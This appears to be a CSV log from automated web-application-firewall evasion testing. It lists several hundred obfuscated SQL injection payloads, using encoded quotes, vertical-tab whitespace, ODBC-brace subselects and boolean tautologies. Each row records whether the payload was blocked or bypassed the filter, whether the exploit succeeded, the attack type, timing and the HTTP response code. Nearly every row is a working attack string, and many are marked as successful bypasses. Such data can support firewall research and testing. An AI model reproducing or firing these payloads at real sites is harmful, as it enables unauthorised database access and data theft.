Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1%0b||+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0123,70.75,No,200
0%27<@=1+or+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.018,70.75,No,200
0'<@!=1.%0b||+not+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0137,70.75,No,500
0'<@!=1.%0b||%0b!%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0153,70.75,No,500
0'<@!=1+or+!~false=+(!%0b,Bypassed,No,None,booleanAtk,0.0221,70.75,No,500
0%27<@=.1+||%0bnot%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0147,70.75,No,200
0'<@!=.1+||+!%0b{x+(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0267,70.75,No,500
0'<@!=1.%0bor+not+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0259,70.87,No,500
0'<@=1.%0b||%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0178,71.0,No,500
0'<@!=1.+or+!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0119,71.0,No,500
0'<@=1.%0bor%0b!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0138,71.0,No,500
0'<@!=1+or+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0275,71.0,No,500
0%27<@=.1%0bor%0bnot+{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0064,71.0,No,200
0'<@!=1.%0b||%0bnot+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0167,71.0,No,500
0%27<@=1+or+!~false=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0153,71.0,No,200
0'or%0b@<@.%0b||%0b1+like+{x+(select,Bypassed,No,None,Unknown,0.0229,71.0,No,500
0%27<@!=1%0bor+!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0165,71.0,No,200
0%27<@!=1.+||+not+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0094,71.0,No,403
0'<@=1%0b||+!+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0168,71.0,No,500
0%27<@=1.+||+not+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0112,71.0,No,200
0%27<@!=1.+or+not+1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0255,71.0,No,200
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0211,71.0,No,200
0%27||+!@<@+||+{x%0b(select%0b1)}=1%0blike,Bypassed,Yes,unionAtk,Unknown,0.0121,71.0,No,200
0%27<@=.1%0bor+not+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0155,71.12,No,200
0%27<@!=1.+or%0b!+1=+(not%7e,Bypassed,Yes,unionAtk,Unknown,0.0119,71.25,No,200
0%27<@=.1+or+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0186,71.25,No,403
0'<@=.1+or+!+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0054,71.25,No,403
0'<@!=1+or+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0088,71.25,No,403
0'<@=.1%0b||%0b{`if`%0b1}=1%0blike+1+or,Bypassed,No,None,Unknown,0.0105,71.25,No,500
0%27<@=.1+||+!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0305,71.25,No,200
0%27<@=1.+or+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0191,71.45,No,200
0%27<@=1.+or%0bnot%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0117,71.45,No,403
0'<@!=1.%0bor+!+true=+(not%0b,Bypassed,No,None,booleanAtk,0.0228,71.45,No,500
0%27<@!=.1%0b||+!%7e0=%0b(false),Bypassed,Yes,unionAtk,Unknown,0.0171,71.45,No,200
0%27<@!=1.%0bor%0bfalse=%0b(not%0b{a,Bypassed,Yes,unionAtk,booleanAtk,0.0146,71.45,No,200
0%27<@=1%0bor+!+1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.022,71.45,No,200
0'<@=.1%0bor%0bnot+{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0187,71.45,No,500
0'<@=.1+||+{a%0b1}=1%0blike+true+or,Bypassed,No,None,booleanAtk,0.0131,71.45,No,500
0'<@=1.%0bor%0bnot%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0184,71.45,No,500
0%27<@!=1.+||+!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0095,71.45,No,403
0'<@=1+or%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0108,71.45,No,500
0%27<@!=.1%0b||%0b!+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0104,71.45,No,200
0%27<@=1%0bor%0bnot~false=%0b(not,Bypassed,Yes,unionAtk,booleanAtk,0.024,71.45,No,200
0'<@!=.1%0b||+not%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0105,71.45,No,500
0'<@!=.1+or+!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0178,71.45,No,500
0'<@!=.1%0b||+{x%0b(select+1)}=1+like%0b{x,Bypassed,No,None,Unknown,0.0171,71.45,No,500
0'<@!=.1%0bor%0bnot%7e0=+(!%0b,Bypassed,No,None,Unknown,0.0158,70.75,No,500
0'<@=1.+||%0b!%0b{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0106,70.75,No,500
0%27<@!=.1+or+not%0btrue=%0b(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0251,70.75,No,200
0%27<@=1.+or+not+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0208,70.75,No,200
0'<@=1%0b||+!%7e0=+(!%0b,Bypassed,No,None,Unknown,0.0186,70.75,No,500
0'<@!=1+||%0b!%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0138,70.75,No,403
0%27<@!=.1%0b||+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0164,70.75,No,200
0%27<@!=.1%0bor+!%0b1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.01,70.75,No,200
0%27<@!=1.+or+!%0btrue=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0113,70.75,No,200
0%27<@=1.+||%0bnot%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0179,70.75,No,403
0'||%0b!@<@+or+!+{x%0b(select+1)}=1,Blocked,No,None,Unknown,0.019,70.75,No,403
0'<@!=.1+or+!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0192,70.75,No,403
0'<@!=1+||%0bnot%0b{x%0b(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0202,70.87,No,403
0%27<@=1%0bor+!%0b{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0168,71.0,No,200
0%27<@=1+or%0b!%7e0=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0145,71.0,No,200
0'<@!=1.%0bor+not+1=%0b(not+,Bypassed,No,None,Unknown,0.0155,71.0,No,500
0%27<@=.1+or%0b!%7e0=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0281,71.0,No,200
0%27<@!=1.+or+!%7efalse=+(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0115,71.0,No,200
0%27<@=1+or%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0046,71.0,No,403
0'<@=1.+or+not+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0243,71.0,No,500
0%27<@=1+||+!%7e0=%0b(0),Bypassed,Yes,unionAtk,Unknown,0.0115,71.0,No,200
0%27<@=1+or%0bnot+{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0157,71.0,No,200
0%27<@!=1+or+not%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0164,71.0,No,200
0%27<@!=.1+||%0bnot%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0146,71.0,No,200
0%27<@!=1.%0bor+not+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0187,71.0,No,200
0'<@!=1+||+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.016,71.0,No,403
0%27<@!=1%0bor+not%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0185,71.0,No,200
0'<@=1.+or+!~0=+(not+,Bypassed,No,None,Unknown,0.0208,71.12,No,500
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.038,71.25,No,200
0%27<@!=1+||+not+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0255,71.25,No,200
0%27<@=1.+||%0b!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0081,71.25,No,403
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.022,71.25,No,200
0%27<@=1+or%0bnot+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0145,71.45,No,200
0'<@!=1%0bor%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0146,71.45,No,500
0'<@=.1%0bor%0b!+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0229,71.45,No,500
0%27<@!=.1%0b||+not%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0203,71.45,No,200
0'<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0175,71.45,No,500
0'<@!=1.%0bor+not%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.015,71.45,No,500
0'<@=.1+or%0b{x%0b(select+1)}=1+like+{x,Bypassed,No,None,Unknown,0.0123,71.45,No,500
0%27<@!=1%0b||+not%0b1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,71.45,No,200
0%27<@!=1%0bor+!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0093,71.45,No,200
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0156,71.45,No,500
0%27<@!=1.+||%0b!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.45,No,200
0%27or%0b@<@.+or%0btrue%0blike+{x%0b(select,Bypassed,Yes,unionAtk,booleanAtk,0.0109,71.45,No,200
0'<@=1+or%0b!~false=+(!+,Bypassed,No,None,booleanAtk,0.0106,71.45,No,500
0'<@!=1.%0b||+0=%0b(!+{x,Bypassed,No,None,Unknown,0.0132,71.45,No,500
0%27<@=.1%0b||+!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0097,71.45,No,200
8%0bor%0b{x%0b(select+1)}=1+like+{`if`+,Blocked,No,None,Unknown,0.0092,71.45,No,403
0%27or%0b!@<@%0bor+!+{`if`%0b1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0117,71.45,No,200
0%27<@=1+or+!%7efalse=+(!%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0177,71.45,No,200
0%27<@=.1%0bor%0b!~false=+(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0169,70.75,No,200
0'<@=1+||%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0072,70.75,No,403
0%27<@=1+||+{a+1}=1%0blike%0b1+||,Bypassed,Yes,unionAtk,Unknown,0.0158,70.75,No,200
0%27<@=.1%0b||%0b!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0119,70.75,No,200
0%27||%0b@<@.+or%0b!%0b{a%0b1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0176,70.75,No,200
0%27<@=.1%0b||%0bnot%0b{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0162,70.75,No,200
0'<@=.1%0b||+!%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0194,70.75,No,500
0'<@!=1+||+!+1=%0b(!~,Bypassed,No,None,Unknown,0.0171,70.75,No,500
0'<@=1+or+!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0191,70.75,No,500
0'<@!=1+or+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0218,70.87,No,403
0%27<@!=1%0bor+not+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0185,71.0,No,200
0'or%0b@<@.+||+not%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0191,71.0,No,500
0%27<@!=1+||+not+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0117,71.0,No,200
0'<@=1+||+!%0b{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.017,71.0,No,500
0'<@=1.+||+!+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0261,71.0,No,500
8%27%0bor+{a+1}=1%0blike%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0207,71.0,No,200
0'<@=.1%0b||%0bnot+{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0212,71.0,No,500
0%27<@!=1.+or%0b!~false=%0b(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0126,71.0,No,200
0'<@=1.+or+!%0b1=%0b(!+,Bypassed,No,None,Unknown,0.027,71.0,No,500
0'<@!=.1+or%0bnot%0b{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0138,71.0,No,500
0'<@!=1+or+!+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0212,71.0,No,500
0%27<@=.1+||%0bnot+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0146,71.0,No,200
0%27<@=1.%0bor+not%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0127,71.0,No,200
0%27<@=1%0bor%0bnot+{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0281,71.0,No,200
0'<@=1.%0b||%0bfalse=%0b(not+{x,Bypassed,No,None,Unknown,0.0153,71.12,No,500
0'<@=1+||+not+true=%0b(!%0b,Bypassed,No,None,Unknown,0.0171,71.25,No,500
0%27<@=.1+or+not~false=%0b(not%7e,Bypassed,Yes,unionAtk,booleanAtk,0.0272,71.25,No,200
0%27<@=.1+||%0bnot+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0284,71.25,No,200
0'<@=.1%0bor+not%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0271,71.35,No,500
0'<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0118,71.45,No,500
0'<@!=.1%0bor+not+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0298,71.45,No,500
0%27<@=.1+or+not+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.02,71.45,No,403
0%27<@!=1.+or+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0241,71.45,No,200
0%27<@!=.1+or+not+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0204,71.45,No,200
0'<@!=1+or+not%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0212,71.45,No,500
0%27<@!=1.+or+!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0311,71.45,No,200
0%27<@=1+||+!%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0164,71.45,No,200
0'<@!=.1+||+!%0b{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0167,71.45,No,500
0%27<@!=.1+||+not%0b{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0107,71.45,No,200
0%27<@=.1+or+!%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.011,71.45,No,200
0'<@=1+or+!+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0209,71.45,No,500
0%27<@!=.1%0bor+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0157,71.45,No,200
0%27||%0b@<@.+or+not%0b{`if`+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0147,71.45,No,200
0%27<@!=1.+or%0bnot%0b{x+(select+1)}=1+is,Blocked,No,None,Unknown,0.0118,71.45,No,403
0%27<@!=1%0bor%0btrue+like+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0186,71.45,No,200
0%27<@!=1+or+!+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.017,71.45,No,200
0'<@=.1%0bor+!+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0135,71.45,No,500
0%27<@=1.%0bor%0b!+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.029,71.45,No,200
0'<@=1+||+!+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0087,71.45,No,403
0'<@!=1%0b||+not+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0221,71.45,No,500
0'<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0138,70.75,No,500
0'<@!=.1+or%0b!%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0147,70.75,No,500
0%27<@!=.1%0b||+{x+(select+1)}=1%0blike+true,Bypassed,Yes,unionAtk,Unknown,0.0102,70.75,No,200
0%27<@=.1+||+not%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0177,70.75,No,200
0%27<@!=.1%0b||%0bnot+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.013,70.75,No,200
0%27<@!=1.+||+!~0=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0241,70.75,No,200
0%27<@!=1.%0bor+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.013,70.75,No,200
0'<@=.1+||+!+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0106,70.75,No,500
0%27<@=.1+||+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0101,70.75,No,403
0'<@=1.+||+!%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0123,70.75,No,500
0%27<@=1%0b||+!+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0199,70.87,No,200
0%27<@!=1.%0bor+!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0204,71.0,No,200
0%27<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0102,71.0,No,200
0%27<@!=1+or%0b!%0b{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0113,71.0,No,403
0%27<@!=1.%0b||+!+true=+(!,Bypassed,Yes,unionAtk,Unknown,0.0198,71.0,No,200
0%27<@!=1.%0b||+not%0btrue=+(!,Bypassed,Yes,unionAtk,Unknown,0.0227,71.0,No,200
0'<@!=1.+or+not+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0164,71.0,No,500
0'<@=1.%0b||+{x%0b(select+1)}=1+like%0btrue,Bypassed,No,None,Unknown,0.0177,71.0,No,500
0'<@=1.%0b||+!%7efalse=+(not+,Bypassed,No,None,Unknown,0.0117,71.0,No,500
0%27<@!=1%0b||+!+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0205,71.0,No,200
0%27<@=1.+||%0bnot%0b{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0246,71.0,No,200
0'<@=1.+or%0b!%0b1=+(!+,Bypassed,No,None,Unknown,0.0117,71.0,No,500
0%27<@!=.1+||+!%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0171,71.0,No,200
0%27<@!=1.%0bor%0b!+true=+(not%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0186,71.0,No,200
0'<@!=.1%0b||%0b!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0143,71.0,No,500
0%27<@=.1%0b||%0b!+{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0109,71.0,No,200
0%27<@=1%0bor+!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0234,71.12,No,200
0%27<@!=1.+or+1%0blike+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0206,71.25,No,200
0'<@=.1+||%0b!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0115,71.25,No,500
0'<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0118,71.25,No,500
0%27<@!=1%0b||%0b!+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0113,71.25,No,200
0'<@=1%0bor%0b{x%0b(select%0b1)}=1+like+{`if`,Bypassed,No,None,Unknown,0.0129,71.25,No,500
0%27<@!=.1+||%0bfalse=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0152,71.45,No,200
0%27<@=1.%0b||+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0151,71.45,No,200
0%27<@!=1%0bor+not%0b{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0126,71.45,No,200
0%27<@!=.1+or+{`if`+1}=1+like+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0161,71.45,No,200
0'<@=.1+or%0bnot~false=%0b(!%7e,Bypassed,No,None,booleanAtk,0.0233,71.45,No,500
0'<@!=1%0b||+not+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0115,71.45,No,500
0%27<@=.1%0bor+not%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0224,71.45,No,200
0%27<@=.1%0bor+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.018,71.45,No,200
0%27<@=1+or%0b{a+1}=1%0blike+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0201,71.45,No,200
0'<@!=.1%0b||+not%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0133,71.45,No,500
0'<@=1.%0b||+not+{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0116,71.45,No,500
0%27<@=.1+||+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0103,71.45,No,200
0'or%0b1<@+or+{`if`+1}=1%0blike+{a,Bypassed,No,None,Unknown,0.0239,71.45,No,500
0%27<@!=.1+||%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0196,71.45,No,200
0%27<@=.1%0b||%0b{x+(select%0b1)}=1+like+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0126,71.45,No,200
0%27<@=1+or%0b!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.018,71.45,No,200
0'<@!=1.%0bor%0bnot%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0267,71.45,No,500
0%27<@!=.1%0bor%0b{a+1}=1=%0b(~%0b,Bypassed,Yes,unionAtk,Unknown,0.0195,71.45,No,200
0%27<@=1+||%0b!+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0073,70.75,No,403
0'<@=1.+||+not+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0114,70.75,No,500
0'<@=1+||%0b!+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0226,70.75,No,500
0'<@!=1+||%0bnot%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0135,70.75,No,500
0'<@!=1.+||+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0198,70.75,No,403
0%27<@=1+or%0bnot+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0102,70.75,No,403
0%27<@=1+||%0b!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0107,70.75,No,403
0'<@=1.+||+not+1=%0b(!+,Bypassed,No,None,Unknown,0.0149,70.75,No,500
0'or%0b!@<@+or+{x+(select%0b1)}=1+like,Blocked,No,None,Unknown,0.0236,70.75,No,403
0'<@!=1.+||%0b{x%0b(select%0b1)}=1+like%0b{`if`,Bypassed,No,None,Unknown,0.0325,70.87,No,500
0'<@!=1.+or%0b!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0251,71.0,No,500
0'<@!=.1%0b||%0b!~false=+(not,Bypassed,No,None,Unknown,0.0153,71.0,No,500
0'<@=1%0b||+not+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0156,71.0,No,500
0'<@!=1%0bor%0bnot+{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0182,71.0,No,500
0%27<@=.1+||+1+like%0btrue%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0156,71.0,No,200
0'<@!=1+||%0bnot+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0077,71.0,No,403
0%27<@=1.+or%0bnot+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0169,71.0,No,200
0%27<@!=1+||%0b!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0243,71.0,No,200
0'||%0b@<@.+||+!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.022,71.0,No,500
0%27<@=.1+or%0bnot%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0122,71.0,No,403
0'<@!=1+or+not%7efalse+is%0bfalse%0b,Bypassed,No,None,booleanAtk,0.0133,71.0,No,500
0%27<@=.1%0bor%0b!+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0112,71.0,No,200
0'<@!=.1+||%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0187,71.0,No,500
0'<@!=.1+||%0bnot%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0168,71.0,No,403
0'<@=1+or+not%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0158,71.0,No,500
0%27<@!=1.%0b||%0b!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0251,71.12,No,200
0'<@!=1.+||+!%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.02,71.25,No,500
0'<@!=.1%0b||%0b!+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0177,71.25,No,500
0%27<@!=1+or%0b!%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0179,71.25,No,200
0'||%0b@<@.%0bor+!%0b{`if`+1}=1=,Bypassed,No,None,Unknown,0.0129,71.25,No,500
0'<@!=.1+or%0bnot+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0234,71.35,No,500
0%27<@=.1+or%0b!+1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0114,71.45,No,200
0%27<@!=1.%0b||%0bnot+true=+(not,Bypassed,Yes,unionAtk,Unknown,0.0323,71.45,No,200
0%27<@!=1.+||%0b{x+(select+1)}=1+like+true,Bypassed,Yes,unionAtk,Unknown,0.0267,71.45,No,200
0%27<@!=.1%0b||%0b!+{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0243,71.45,No,200
